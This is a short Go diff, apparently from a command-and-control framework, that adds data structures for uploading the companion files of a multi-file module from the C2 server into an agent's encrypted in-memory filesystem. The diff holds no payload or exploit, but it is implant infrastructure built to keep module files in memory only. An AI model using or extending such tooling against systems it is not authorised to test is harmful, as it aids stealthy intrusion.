@@ -128,6 +128,19 @@ type ResolvedInvocation struct {
 	DllExport    string `cbor:"7,keyasint"` // exported symbol to call
 	DllEntry     string `cbor:"8,keyasint"` // BOF entry function name
 	DllFileValue string `cbor:"9,keyasint"` // resolved BOF file path (agent local/memfs)
+
+	// ModuleFiles lists companion files of a multi-file module that must be
+	// uploaded and cached in encrypted memfs before the module executes
+	// (when config.ModuleFilesMemFS is enabled). Starlark modules can then
+	// read them transparently via read_file("mem:///...").
+	ModuleFiles []ResolvedModuleFile `cbor:"10,keyasint"`
+}
+
+// ResolvedModuleFile describes one companion file of a multi-file module.
+type ResolvedModuleFile struct {
+	Name     string `cbor:"1,keyasint"` // hosted basename on C2 (used as file_to_download)
+	MemPath  string `cbor:"2,keyasint"` // destination memfs path, e.g. mem:///<module>/<basename>
+	Checksum string `cbor:"3,keyasint"` // SHA256 of the hosted (compressed) file
 }
 
 // ResolvedCoffInvocation contains packed COFF args with concrete values
@@ -171,6 +184,11 @@ type ModuleConfig struct {
 	AgentConfig  AgentModuleConfig `cbor:"11,keyasint"` // Configuration for agent side
 	Invocation   InvocationSpec    `cbor:"12,keyasint"` // how to run the module without run.sh/env
 	Dependencies []string          `cbor:"13,keyasint"` // module names that must be loaded before this one (e.g. "coffloader")
+
+	// ModuleFilesMemFS uploads and caches every module file in encrypted
+	// memfs (mem:///) so multi-file starlark modules can read their companion
+	// files transparently via read_file().
+	ModuleFilesMemFS bool `cbor:"14,keyasint"`
 }
 
 // Module help info and options
